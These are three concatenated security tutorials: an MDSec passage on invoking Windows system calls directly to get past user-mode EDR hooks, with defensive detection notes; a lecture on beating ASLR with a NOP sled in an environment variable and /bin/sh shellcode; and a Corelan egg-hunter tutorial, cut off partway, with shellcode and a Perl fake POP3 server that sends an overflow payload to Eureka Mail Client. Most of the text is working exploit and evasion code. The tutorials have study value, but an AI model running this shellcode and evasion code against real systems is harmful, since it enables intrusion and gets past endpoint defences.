call?\nloopne  find_syscall\njne     sort_syscall\n; hash the system call name\nxor     eax, eax\nmov     edx, 0x4e000074     ; \"Nt\"\nhash_syscall:\nlodsb\ntest    al, al\njz      get_address\nror     edx, 8\nadd     edx, eax\njmp     hash_syscall\nget_address:\nmovzx   eax, word[r9+rcx*2]  ; eax = AddressOfNameOrdinals[rcx]\nmov     eax, [r8+rax*4]      ; eax = AddressOfFunctions[eax]\nstosd                        ; save Address\nxchg    eax, edx\nstosd                        ; save Hash\ninc     dword[rsp]           ; Entries++\n; exports remaining?\ntest    ecx, ecx\njnz     find_syscall\n;\n; Bubble sort.\n; Arranges Table entries by Address in ascending order.\n;\n; Based on the 16-byte sort code by Jibz\n;\n; https:\/\/gist.github.com\/jibsen\/8afc36995aadb896b649\n;\nsort_syscall:\npop     rax              ; Entries\npop     rdi              ; List\nstosd                    ; List->Entries = Entries\nlea     ecx, [eax - 1]   ; ecx = Entries - 1\nouterloop:\npush    rcx              ; save rcx for outer loop\npush    rdi              ; rdi = Table\npush    rdi              ; rsi = Table\npop     rsi\ninnerloop:\nlodsq                    ; load Address + Hash\ncmp     eax, [rsi]       ; do we need to swap?\njbe     order_ok\nxchg    rax, [rsi]       ; if so, this is first step\norder_ok:\nstosq                    ; second step, or just write back rax\nloop    innerloop\npop     rdi\npop     rcx              ; restore number of elements\nloop    outerloop        ; rcx is used for both loops\nexit_get_list:\n; restore non-volatile registers\npopx   rsi, rbx, rdi, rbp\nret\nTo resolve a system call name to SSN, we can use the following\nfunction. Given the hash of a system call name we wish to use, this\nwill search the table for a match and return the SSN. If the system\ncall is not supported by the operating system, this function will\nsimply return FALSE:\n\/\/\n\/\/ Get the System Service Number from list.\n\/\/\nstatic\nBOOL\nGetSSN(PSYSCALL_LIST List, DWORD Hash, PDWORD Ssn) {\nDWORD i;\nfor(i=0; i<List->Entries; i++) {\nif(Hash == List->Table[i].Hash) {\n*Ssn = i;\nreturn TRUE;\n}\n}\nreturn FALSE;\n}\nAnd assembly:\n;\n; Lookup the System Service Number for a hash.\n;\nGetSSN_amd64:\nlea     r9, [rcx+4]         ; r9 = List->Table\nmov     ecx, dword[rcx]     ; ecx = List->Entries\nor      ebx, -1             ; i = -1\nsearch_table:\ninc     ebx                 ; i++\ncmp     edx, [r9+rbx*8+4]   ; our hash?\nloopne  search_table        ; loop until found or no entries left\njne     exit_search\nmov     dword[r8], ebx      ; if found, save SSN\nexit_search:\nsete    al                  ; return TRUE or FALSE\nret\nThe code stub used to execute an SSN can be embedded in the .text\nsection of the PoC, but might make more sense moving to an area of\nmemory that won\u2019t be detected as a manual call:\nInvokeSsn_amd64:\npop     rax            ; return address\npop     r10\npush    rax            ; save in shadow space as _rcx\npush    rcx            ; rax = ssn\npop     rax\npush    rdx            ; rcx = arg1\npop     r10\npush    r8             ; rdx = arg2\npop     rdx\npush    r9             ; r8 = arg3\npop     r8\n; r9 = arg4\nmov     r9, [rsp + SHADOW_SPACE_size]\nsyscall\njmp     qword[rsp+SHADOW_SPACE._rcx]\nThe following code demonstrates how to use the above functions to\ninvoke ntdll!NtAllocateVirtualMemory:\nSYSCALL_LIST   List;\nDWORD          SsnId, SsnHash;\nInvokeSsn_t    InvokeSsn;\n\/\/\n\/\/ Gather a list of system calls from the Export Address Table.\n\/\/\nGetSyscallList(&List);\n{\n\/\/\n\/\/ Test allocating virtual memory\n\/\/\nSsnHash = ct_HashSyscall(\"NtAllocateVirtualMemory\");\nif(!GetSSN(&List, SsnHash, &SsnId)) {\nprintf(\"Unable to find SSN for NtAllocateVirtualMemory : %08lX.\\n\", SsnH\nash);\nreturn 0;\n}\nPVOID BaseAddress = NULL;\nSIZE_T RegionSize = 4096;\nULONG flAllocationType = MEM_COMMIT | MEM_RESERVE;\nULONG flProtect = PAGE_READWRITE;\nNTSTATUS Status;\nInvokeSsn = (InvokeSsn_t)&InvokeSsn_stub;\nprintf(\"Invoking SSN : %ld\\n\", SsnId);\nStatus = InvokeSsn(\nSsnId,\nNtCurrentProcess(),\n&BaseAddress,\n0,\n&RegionSize,\nflAllocationType,\nflProtect\n);\nprintf(\"Status : %s (%08lX)\\n\",\nStatus == STATUS_SUCCESS ? \"Success\" : \"Failed\", Status);\nif(BaseAddress != NULL) {\nprintf(\"Releasing memory allocated at %p\\n\", BaseAddress);\nVirtualFree(BaseAddress, 0, MEM_RELEASE | MEM_DECOMMIT);\n}\n}\nShortly after writing code based on the idea suggested by userman01,\nanother project that implements the same idea was discovered [51]here.\nDetecting Manual Invocation\nWhat can defenders do to protect themselves?\nByte Signatures and Emulation\nUnless obfuscated\/encrypted, the code stubs inside an image to execute\none or more system calls will clearly indicate malicious intent because\nthere\u2019s no legitimate reason for a non-Microsoft application to execute\nthem directly. The only exception would be cirvumventing UM hooks\ninstalled by a malicious application. A [52]YARA signature for the\n\u201csyscall\u201d instruction or a rule for Fireeye\u2019s [53]CAPA to automate\ndiscovery is a good start. Generally, any non-Microsoft application\nthat reads the PEB or KUSER_SHARED_DATA are simple indicators of\nsomething malicious being executed. Emulation of code with\nthe [54]Unicorn Engine to detect a stub inside obfuscated\/encrypted\ncode is also an idea that understandably takes more time and effort to\nimplement.\nMitigation Policies\nMicrosoft provide [55]a range of mitigation policies that can be\nenforced upon a process to block malicious code from executing. Import\nand Export Address Filtering are two potential ways that could prevent\nenumeration of the system call names. There\u2019s\nalso [56]ProcessSystemCallDisablePolicy to disable Win32k system calls\nfor syscalls in user32.dll or win32u.dll. Another policy that remains\nundocumented by Microsoft is ProcessSystemCallFilterPolicy.\nInstrumentation Callback\n[57]Windows x64 system service hooks and advanced debugging describes\nthe [58]ProcessInstrumentationCallback info class that was also\ndiscussed by [59]Alex Ionescu at Recon 2015 in his [60]Hooking Nirvana\npresentation. It allows post-processing of system calls and can be used\nto detect manual invocation. Defenders could install the callback and\nafter each invocation examine the return address to determine if it\noriginated from within NTDLL.dll, user32.dll, Win32u.dll or some other\narea of memory system calls shouldn\u2019t exist.\n[61]ScyllaHide is an Anti-Anti-Debug library that uses this method of\ndetection. However, at the time of writing this, it only checks if the\ncall originated from inside the host image. A simple bypass is to\nchange the return address to a location outside it. As you can see,\nit\u2019s also possible to manipulate the NTSTATUS value of a system call.\nULONG_PTR\nNTAPI\nInstrumentationCallback(\n_In_ ULONG_PTR ReturnAddress,\n_Inout_ ULONG_PTR ReturnVal\n)\n{\nPVOID ImageBase = NtCurrentPeb()->ImageBaseAddress;\nPIMAGE_NT_HEADERS NtHeaders = RtlImageNtHeader(ImageBase);\n\/\/ is the return address within the host image?\nif (ReturnAddress >= (ULONG_PTR)ImageBase &&\nReturnAddress < (ULONG_PTR)ImageBase + NtHeaders->OptionalHeader.SizeOfI\nmage)\n{\n\/\/ manual system call detected.\n}\n}\nThe following code installs the callback:\n\/\/ Windows 7-8.1 require SE_DEBUG for this to work, even on the current proc\ness\nBOOLEAN SeDebugWasEnabled;\nStatus = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnab\nled);\nPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;\nInstrumentationCallbackInfo.Version  = 0;\nInstrumentationCallbackInfo.Reserved = 0;\nInstrumentationCallbackInfo.Callback = InstrumentationCallback;\nStatus = NtSetInformationProcess(\nProcessHandle,\nProcessInstrumentationCallback,\n&InstrumentationCallbackInfo,\nsizeof(InstrumentationCallbackInfo)\n);\nFortunately for red teams, it\u2019s possible to remove any callback with\nNtSetInformationProcess by setting the callback to NULL.\nIntel Processor Trace (IPT)\n[62]Intel\u2019s binary instrumentation tool, which facilitates tracing at\ninstruction level with triggering and filtering capabilities, can be\nused to intercept [63]system calls before and after execution. Intel\nSkylake and later CPU models also support IPT, that provides similar\nfunctionality on Windows 10 since build 1803.\n* [64]WinIPT for Windows RS5\n* [65]Windows Intel PT Support Driver\nFurther Research\n* [66]Silencing Cylance: A Case Study in Modern EDRs\n* [67]Red Team Tactics: Combining Direct System Calls and sRDI to\nbypass AV\/EDR\n* [68]Userland API Monitoring and Code Injection Detection]\n* [69]Defeating Userland Hooks (ft. Bitdefender)\n* [70]Universal Unhooking: Blinding Security\n* [71]Floki Bot and the stealthy dropper\n* [72]Latest Trickbot Variant has New Tricks Up Its Sleeve\n* [73]Malware Mitigation when Direct System Calls are Used\n* [74]FreshyCalls: Syscalls Freshly Squeezed!\n* [75]Win32k System Call Filtering Deep Dive\n* [76]Implementing Direct Syscalls Using Hell\u2019s Gate\n* [77]Full DLL Unhooking with C++\n* [78]Red Team Tactics: Utilizing Syscalls in C# \u2013 Prerequisite\nKnowledge\n* [79]Red Team Tactics: Utilizing Syscalls in C# \u2013 Writing The Code\n* [80]Bypassing Cylance and other AVs\/EDRs by Unhooking Windows APIs\n* [81]Bypass EDR\u2019s memory protection, introduction to hooking\n* [82]Shellycoat\n* [83]Defeating Antivirus Real-time Protection From The Inside\n* [84]Using Syscalls to Inject Shellcode on Windows\n* [85]Hooking the System Service Dispatch Table (SSDT)\n* [86]Intercepting the Windows 10 (1903) System Service call using\nthe weakness caused by the dynamic trace support.\n* [87]Dynamic Tracing on Windows\n* [88]Using Intel PT for Vulnerability Triaging with IPTAnalyzer\n* [89]Yes, More Callbacks \u2014 The Kernel Extension Mechanism\n* [90]How Advanced Malware Bypasses Process Monitoring\n* [91]Staying Hidden on the Endpoint: Evading Detection with\nShellcode\n* [92]InfinityHook\n* [93]Bypassing PatchGuard on Windows x64 by Skywing\nThis blog post was written by [94]@modexpblog.\nwritten by\nMDSec Research\nReady to engage\nwith MDSec?\n[95]Get in touch\nStay updated with the latest\nnews from MDSec.\nNewsletter Signup Form\nEmail ____________________\nIf you are human, leave this field blank. ____________________\n(BUTTON) Submit\n[96]MDsec\nServices\n* [97]Adversary Simulation\n* [98]Application Security\n* [99]Penetration Testing\n* [100]Response\nResource Centre\n* [101]Research\n* [102]Training\n* [103]Insights\nCompany\n* [104]About\n* [105]Contact\n* [106]Careers\n* [107]Privacy\nt: +44 (0) 1625 263 503\ne: [108]contact@mdsec.co.uk\n32A Park Green\nMacclesfield\nCheshire\nSK11 7NA\nAccreditations\nBest\nIT Health Check Service\nCrest Star\nCrest\nCyber Essentials\nBritish Assessment Bureau\nCopyright 2024 MDSec"}
{"text":"# Shellcode injection with ASLR\n\nIn the previous [Lecture](..\/Lecture2\/README.md) I talked about, injection of\nshell code when the ASLR was disabled. ASLR allows randomization of\ndifferent segment address. So it's not very trivial to identify the buffer address. The address of buffer keep on changing with every run of the program. So when the return address points to the buffer address (that keeps on changing), putting the executable shell code in memory is not so easy.\n\nTo disable ALSR,\n`echo \"0\" | sudo dd of=\/proc\/sys\/kernel\/randomize_va_space`\nTo enable the same,\n`echo \"2\" | sudo dd of=\/proc\/sys\/kernel\/randomize_va_space`\n\n#### Scenario 1: With `nop - \\x90` sled.\nSuppose I appended few `nop` (no operation instruction) before the shellcode.\n\n#### NOP\n> In computer science, a NOP, no-op, or NOOP (pronounced \"no op\"; short for no operation) is an assembly language instruction, programming language statement, or computer protocol command that does nothing.\n\nLets say I added 20 `nop` before the shellcode.\n`python -c 'import struct;shellcode=\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"; bufferlen=108; print \"\\x90\"*20+shellcode+\"\\x90\"*(bufferlen-len(shellcode)-20)+\"BBBB\"+struct.pack(\"<I\", starting address of the buffer)'`\nAnd make return address point to any of the **21** locations, from the staerting address of the buffer to the starting address of the shellcode ( address of buffer + 20), then I will spawn the shell indeed. But **what is the probability?** That return address(which is nothing but buffer address) will end up in any of those locations. The higher the probability, higher are the chances for exploitation.\n\nThe starting address of buffer would be `0xff_ _ _ _ _ _ _` in which the first `0xff` is fixed, because the buffer will lie in the upper portion of memory.\nTo test this, create a simple C program:\n```C\nint main()\n{\n    int a;\n    printf(\"%p\\n\", &a);\n    return 0;\n}\n```\nCompile and run this program for say 10 runs.\n```bash\n$ for i in {1..10};do .\/a.out;done\n0xffe918bc\n0xffdc367c\n0xffeaf37c\n0xffc31ddc\n0xffc6a56c\n0xffbcf9bc\n0xffbcf02c\n0xffbf1dcc\n0xfffe386c\n0xff9547cc\n```\nThe observation is same what we have assumed. You can test the programs for more trials in case you are not convinced.\nIt seems that every time the variable is loaded at different addresses in the stack. The address can be represented as 0xffXXXXXc(where X is any hexadecimal digit). With some more testing, it can be seen that even the last half-byte(\u2018c\u2019 over here) depends on the relative location of the variable inside the program. So in general, the address of a variable on the stack is 0xffXXXXXX. This amounts to 16^6 = 16777216 possible cases. It can be easily seen that the earlier method, mentioned above to exploit the stack, will now work with only 21\/16777216 probability(21 is the length of NOP slide, if any of those NOP bytes happens to be where the modified return address is, the shellcode will be executed).\nThat means on an average, 1 in ~ 40K runs, the shellcode will be executed. This is way less. In any way we got he hint that somehow we need to increase the length of the `nop` sled on the buffer, but the buffer length is limited. Increasing the size of `nop` will increase the chances of shellcode to run. But How?\n\nWhy not take the help of **environment variable**?\n\n#### Scenario 2: Putting long shellcode in env variable\nIn my vagrant system, I can make the environment variable way long the size of the buffer. My system allows the environment variable to be of length 100K. The reason we are picking the environment variable is that, they are itself loaded just above the stack.\nLets create environment variable, say `SHELLCODE`.\n`export SHELLCODE=$(python -c 'print \"\\x90\"*100000 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"')\n`\nAnd instead of putting the return address to starting address of the buffer, I will put the return address to any of the randomly picked higher memory address. Lets say any address in between highest address `0xffffffff` and `0xff9547cc`. I am picking `0xff882222`.\n\n`$ for i in {1..100}; do .\/exploit_me_3 $(python -c 'import struct;print \"A\"*112 + struct.pack(\"<I\", 0xff882222)'); done`\n\n```bash\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\nSegmentation fault\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\nSegmentation fault\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\nSegmentation fault\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\nSegmentation fault\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\n$whoami\nvagrant\n```\n\nAfter few attempts, we got the shell. :cool: isn't it !!\n\n"}
{"text":"#[1]Corelan Cybersecurity Research \u00bb Feed [2]Corelan Cybersecurity\nResearch \u00bb Comments Feed [3]Corelan Cybersecurity Research \u00bb Exploit\nwriting tutorial part 8 : Win32 Egg Hunting Comments Feed [4]alternate\n[5]alternate [6]alternate\n[7]Corelan Cybersecurity Research\n:: Knowledge is not an object, it's a flow ::\n* [8]Home\n*\n* [9]Articles\n*\n* [10]Free Tools\n+ [11]AD & CS\no [12]AD Disable Users\no [13]Certificate List Utility\no [14]PVE Find AD User\n+ [15]Exchange Transport Agents\no [16]Attachment filter\no [17]Attachment rename\n+ [18]Networking\no [19]Cisco switch backup utility\no [20]Network monitoring with powershell\no [21]TCP Ping\n+ [22]Security Related Tools\n*\n* [23]Security\n+ [24]Corelan Team Members\no [25]Corelan Team Membership\n+ [26]Corelan Training \"Corelan Live\u2026\n+ [27]Exploit writing tutorials\n+ [28]Metasploit\no [29]FTP Client fuzzer\no [30]HTTP Form field fuzzer\no [31]Simple FTP Fuzzer \u2013 Metasploit\u2026\n+ [32]Nessus\/Openvas ike-scan wrapper\n+ [33]Vulnerability Disclosure Policy\n+ [34]mona.py PyCommand for Immunity Debugger\no [35]Download mona.py\no [36]Mona.py \u2013 documentation\n+ [37]Corelan ROPdb\n+ [38]Mirror for BoB\u2019s Immunity Debugger\u2026\n*\n* [39]Terms of use\n*\n* [40]Donate\n*\n* [41]About\u2026\n+ [42]About Corelan Team\n+ [43]About me\n+ [44]Antivirus\/antimalware\n+ [45]Corelan public keys\n+ [46]Sitemap\n\u00ab [47]Happy New Year\n[48]Starting to write Immunity Debugger PyCommands : my cheatsheet \u00bb\nPlease consider donating: [49]https:\/\/www.corelan.be\/index.php\/donate\/\n95,700 views\nExploit writing tutorial part 8 : Win32 Egg Hunting\nPublished January 9, 2010 | By [50]Peter Van Eeckhoutte (corelanc0d3r)\nIntroduction\nEaster is still far away, so this is probably the right time to talk\nabout ways to hunting for eggs (so you would be prepared when the\neaster bunny brings you another 0day vulnerability)\nIn the first parts of this exploit writing tutorial series, we have\ntalked about stack based overflows and how they can lead to arbitrary\ncode execution. In all of the exploits that we have built so far, the\nlocation of where the shellcode is placed is more or less static and\/or\ncould be referenced by using a register (instead of a hardcoded stack\naddress), taking care of stability and reliability.\nIn some parts of the series, I have talked about various techniques to\njump to shellcode, including techniques that would use one or more\ntrampolines to get to the shellcode.  In every example that was used to\ndemonstrate this, the size of the available memory space on the stack\nwas big enough to fit our entire shellcode.\nWhat if the available buffer size is too small to squeeze the entire\nshellcode into ? Well, a technique called egg hunting may help us out\nhere. Egg hunting is a technique that can be categorized as \u201c[51]staged\nshellcode\u201d, and it basically allows you to use a small amount of custom\nshellcode to find your actual (bigger) shellcode (the \u201cegg\u201d) by\nsearching for the final shellcode in memory.  In other words, first a\nsmall amount of code is executed, which then tries to find the real\nshellcode and executes it.\nThere are 3 conditions that are important in order for this technique\nto work\n1. You must be able to jump to (jmp, call, push\/ret) & execute \u201csome\u201d\nshellcode.  The amount of available buffer space can be relatively\nsmall, because it will only contain the so-called \u201cegg hunter\u201d.  The\negg hunter code must be available in a predictable location (so you can\nreliably jump to it & execute it)\n2. The final shellcode must be available somewhere in memory\n(stack\/heap\/\u2026).\n3. You must \u201ctag\u201d or prepend the final shellcode with a unique\nstring\/marker\/tag. The initial shellcode (the small \u201cegg hunter\u201d) will\nstep through memory, looking for this marker. When it finds it, it will\nstart executing the code that is placed right after the marker using a\njmp or call instruction.  This means that you will have to define the\nmarker in the egg hunter code, and also write it just in front of the\nactual shellcode.\nSearching memory is quite processor intensive and can take a while.\nSo when using an egg hunter, you will notice that\n\u2013 for a moment (while memory is searched) all CPU memory is taken.\n\u2013 it can take a while before the shellcode is executed. (imagine you\nhave 3Gb or RAM)\nHistory & Basic Techniques\nOnly a small number of manuals have been written on this subject :\nSkape wrote [52]this excellent paper a while ago, and you can also find\nsome good info on heap-only egg hunting [53]here.\nSkape\u2019s document really is the best reference on egg hunting that can\nbe found on the internet. It contains a number of techniques and\nexamples for Linux and Windows, and clearly explains how egg hunting\nworks, and how memory can be searched in a safe way.\nI\u2019m not going to repeat the technical details behind egg hunting here,\nbecause skape\u2019s document is well detailed and speaks for itself.  I\u2019ll\njust use a couple of examples on how to implement them in stack based\noverflows.\nYou just have to remember :\n\u2013 The marker needs to be unique (Usually you need to define the tag as\n4 bytes inside the egg hunter, and 2 times (2 times right after each\nother, so 8 bytes) prepended to the actual shellcode.\n\u2013 You\u2019ll have to test which technique to search memory works for a\nparticular exploit.  (NTAccessCheckAndAuditAlarm seems to work best on\nmy system)\n\u2013 Each technique requires a given number of available space to host the\negg hunter code :\nthe SEH technique uses about 60 bytes, the IsBadReadPtr requires 37\nbytes, the NtDisplayString method uses 32 bytes.  (This last technique\nonly works on NT derived versions of Windows. The others should work on\nWindows 9x as well.)\nEgg hunter code\nAs explained above, skape has outlined 3 different egg hunting\ntechniques for Windows based exploits.  Again, I\u2019m not going to explain\nthe exact reasoning behind the egg hunters, I\u2019m just going to provide\nyou with the code needed to implement an egg hunter.\nThe decision to use a particular egg hunter is based on\n\u2013 available buffer size to run the egg hunter\n\u2013 whether a certain technique for searching through memory works on\nyour machine or for a given exploit or not. You just need to test.\nEgg hunter using SEH injection\nEgg hunter size = 60 bytes, Egg size = 8 bytes\nEB21       jmp short 0x23\n59         pop ecx\nB890509050 mov eax,0x50905090  ; this is the tag\n51         push ecx\n6AFF       push byte -0x1\n33DB       xor ebx,ebx\n648923     mov [fs:ebx],esp\n6A02       push byte +0x2\n59         pop ecx\n8BFB       mov edi,ebx\nF3AF       repe scasd\n7507       jnz 0x20\nFFE7       jmp edi\n6681CBFF0F or bx,0xfff\n43         inc ebx\nEBED       jmp short 0x10\nE8DAFFFFFF call 0x2\n6A0C       push byte +0xc\n59         pop ecx\n8B040C     mov eax,[esp+ecx]\nB1B8       mov cl,0xb8\n83040806   add dword [eax+ecx],byte +0x6\n58         pop eax\n83C410     add esp,byte+0x10\n50         push eax\n33C0       xor eax,eax\nC3         ret\nIn order to use this egg hunter, your egg hunter payload must look like\nthis :\nmy $egghunter = \"\\xeb\\x21\\x59\\xb8\".\n\"w00t\".\n\"\\x51\\x6a\\xff\\x33\\xdb\\x64\\x89\\x23\\x6a\\x02\\x59\\x8b\\xfb\".\n\"\\xf3\\xaf\\x75\\x07\\xff\\xe7\\x66\\x81\\xcb\\xff\\x0f\\x43\\xeb\".\n\"\\xed\\xe8\\xda\\xff\\xff\\xff\\x6a\\x0c\\x59\\x8b\\x04\\x0c\\xb1\".\n\"\\xb8\\x83\\x04\\x08\\x06\\x58\\x83\\xc4\\x10\\x50\\x33\\xc0\\xc3\";\n(where w00t is the tag. You could write w00t as \u201c\\x77\\x30\\x30\\x74\u201d as\nwell)\nNote : the SEH injection technique will probably become obsolete, as\nSafeSeh mechanisms are becoming the de facto standard in newer OS\u2019s and\nService Packs. So if you need to use an egg hunter on XP SP3, Vista,\nWin7\u2026, you\u2019ll either have to bypass safeseh one way or another, or use\na different egg hunter technique (see below)\nEgg hunter using IsBadReadPtr\nEgg hunter size = 37 bytes, Egg size = 8 bytes\n33DB       xor ebx,ebx\n6681CBFF0F or bx,0xfff\n43         inc ebx\n6A08       push byte +0x8\n53         push ebx\nB80D5BE777 mov eax,0x77e75b0d\nFFD0       call eax\n85C0       test eax,eax\n75EC       jnz 0x2\nB890509050 mov eax,0x50905090 ; this is the tag\n8BFB       mov edi,ebx\nAF         scasd\n75E7       jnz 0x7\nAF         scasd\n75E4       jnz0x7\nFFE7       jmp edi\nEgg hunter payload :\nmy $egghunter = \"\\x33\\xdb\\x66\\x81\\xcb\\xff\\x0f\\x43\\x6a\\x08\".\n\"\\x53\\xb8\\x0d\\x5b\\xe7\\x77\\xff\\xd0\\x85\\xc0\\x75\\xec\\xb8\".\n\"w00t\".\n\"\\x8b\\xfb\\xaf\\x75\\xe7\\xaf\\x75\\xe4\\xff\\xe7\";\nEgg hunter using NtDisplayString\nEgg hunter size = 32 bytes, Egg size = 8 bytes\n6681CAFF0F  or dx,0x0fff\n42          inc edx\n52          push edx\n6A43        push byte +0x43\n58          pop eax\nCD2E        int 0x2e\n3C05        cmp al,0x5\n5A          pop edx\n74EF        jz 0x0\nB890509050  mov eax,0x50905090  ; this is the tag\n8BFA        mov edi,edx\nAF          scasd\n75EA        jnz 0x5\nAF          scasd\n75E7        jnz 0x5\nFFE7        jmp edi\nEgg hunter payload :\nmy $egghunter =\n\"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x43\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x74\\xEF\\xB8\".\n\"w00t\".\n\"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7\";\nor, as seen in Immunity :\n[54]image\nEgg hunter using NtAccessCheck (AndAuditAlarm)\nAnother egg hunter that is very similar to the NtDisplayString hunter\nis this one :\nmy $egghunter =\n\"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x74\\xEF\\xB8\".\n\"\\x77\\x30\\x30\\x74\". # this is the marker\/tag: w00t\n\"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\\xE7\";\nInstead of using NtDisplayString, it uses NtAccessCheckAndAuditAlarm\n(offset 0x02 in the KiServiceTable) to prevent access violations from\ntaking over your egg hunter. More info about NtAccessCheck can be found\n[55]here and here.  Also, my friend Lincoln created a nice video about\nthis egg hunter : watch the video here\nBrief explanation on how NtDisplayString \/ NtAccessCheckAndAuditAlarm egg\nhunters work\nThese 2 egg hunters use a similar technique, but only use a different\nsyscall to check if an access violation occurred or not (and survive\nthe AV)\nNtDisplayString prototype :\nNtDisplayString(\nIN PUNICODE_STRING String );\nNtAccessCheckAndAuditAlarm prototype :\nNtAccessCheckAndAuditAlarm(\nIN PUNICODE_STRING      SubsystemName OPTIONAL,\nIN HANDLE               ObjectHandle OPTIONAL,\nIN PUNICODE_STRING      ObjectTypeName OPTIONAL,\nIN PUNICODE_STRING      ObjectName OPTIONAL,\nIN PSECURITY_DESCRIPTOR SecurityDescriptor,\nIN ACCESS_MASK          DesiredAccess,\nIN PGENERIC_MAPPING     GenericMapping,\nIN BOOLEAN              ObjectCreation,\nOUT PULONG              GrantedAccess,\nOUT PULONG              AccessStatus,\nOUT PBOOLEAN            GenerateOnClose );\n(prototypes found at [56]http:\/\/undocumented.ntinternals.net\/)\nThis is what the hunter code does :\n6681CAFF0F  or dx,0x0fff   ; get last address in page\n42          inc edx        ; acts as a counter\n;(increments the value in EDX)\n52          push edx       ; pushes edx value to the  stack\n;(saves our current address on the stack)\n6A43        push byte +0x2 ; push 0x2 for NtAccessCheckAndAuditAlarm\n; or 0x43 for NtDisplayString to stack\n58          pop eax        ; pop 0x2 or 0x43 into eax\n; so it can be used as parameter\n; to syscall - see next\nCD2E        int 0x2e       ; tell the kernel i want a do a\n; syscall using previous register\n3C05        cmp al,0x5     ; check if access violation occurs\n;(0xc0000005== ACCESS_VIOLATION) 5\n5A          pop edx        ; restore edx\n74EF        je xxxx        ; jmp back to start dx 0x0fffff\nB890509050  mov eax,0x50905090 ; this is the tag (egg)\n8BFA        mov edi,edx    ; set edi to our pointer\nAF          scasd          ; compare for status\n75EA        jnz xxxxxx     ; (back to inc edx) check egg found or not\nAF          scasd          ; when egg has been found\n75E7        jnz xxxxx      ; (jump back to \"inc edx\")\n; if only the first egg was found\nFFE7       jmp edi         ; edi points to begin of the shellcode\n(thanks Shahin Ramezany !)\nImplementing the egg hunter \u2013 All your w00t are belong to us !\nIn order to demonstrate how it works, we will use a [57]recently\ndiscovered vulnerability in Eureka Mail Client v2.2q, discovered by\nFrancis Provencher. You can get a copy of the vulnerable version of\nthis application here :\nPlease log in to download Eureka Mail Client v2.2q (2.6 MiB)\nInstall the application. We\u2019ll configure it later on.\nThis vulnerability gets triggered when a client connects to a POP3\nserver.  If this POP3 server sends long \/  specifically crafted  \u201c-ERR\u201d\ndata back to the client, the client crashes and arbitrary code can be\nexecuted.\nLet\u2019s build the exploit from scratch on XP SP3 English (VirtualBox).\nWe\u2019ll use some simple lines of perl code to set up a fake POP3 server\nand send a string of 2000 bytes back (metasploit pattern).\nFirst of all, grab a copy of the [58]pvefindaddr plugin for Immunity\nDebugger.  Put the plugin in the pycommands folder of Immunity and\nlaunch Immunity Debugger.\nCreate a metasploit pattern of 2000 characters from within Immunity\nusing the following command :\n!pvefindaddr pattern_create 2000\n[59]image\nIn the Immunity Debugger application folder, a file called\nmspattern.txt is now created, containing the 2000 character Metasploit\npattern.\n[60]image\nOpen the file and copy the string to the clipboard.\nNow create your exploit perl script and use the 2000 characters as\npayload (in $junk)\nuse Socket;\n#Metasploit pattern\"my $junk = \"Aa0...\";  #paste your 2000 bytes pattern here\nmy $payload=$junk;\n#set up listener on port 110\nmy $port=110;\nmy $proto=getprotobyname('tcp');\nsocket(SERVER,PF_INET,SOCK_STREAM,$proto);\nmy $paddr=sockaddr_in($port,INADDR_ANY);\nbind(SERVER,$paddr);\nlisten(SERVER,SOMAXCONN);\nprint \"[+] Listening on tcp port 110 [POP3]... \\n\";\nprint \"[+] Configure Eureka Mail Client to connect to this host\\n\";\nmy $client_addr;\nwhile($client_addr=accept(CLIENT,SERVER))\n{\nprint \"[+] Client connected, sending evil payload\\n\";\nwhile(1)\n{\nprint CLIENT \"-ERR \".$payload.\"\\n\";\nprint \" -> Sent \".length($payload).\" bytes\\n\";\n}\n}\nclose CLIENT;\nprint \"[+] Connection closed\\n\";\nNotes :\n\u2013 Don\u2019t use 2000 A\u2019s or so \u2013 it\u2019s important for the sake of this\ntutorial to use a Metasploit pattern\u2026 Later in this tutorial, it will\nbecome clear why this is important).\n\u2013 If 2000 characters does not trigger the overflow\/crash, try using a\nMetasploit pattern of 5000 chars instead\n\u2013 I used a while(1) loop because the client does not crash after the\nfirst -ERR payload.  I know, it may look better if you would figure out\nhow many iterations are really needed to crash the client, but I like\nto use endless loops because they work too most of the time :-)\nRun this perl script. It should say something like this :\n[61]image\nNow launch Eureka Mail Client. Go to \u201cOptions\u201d \u2013 \u201cConnection Settings\u201d\nand fill 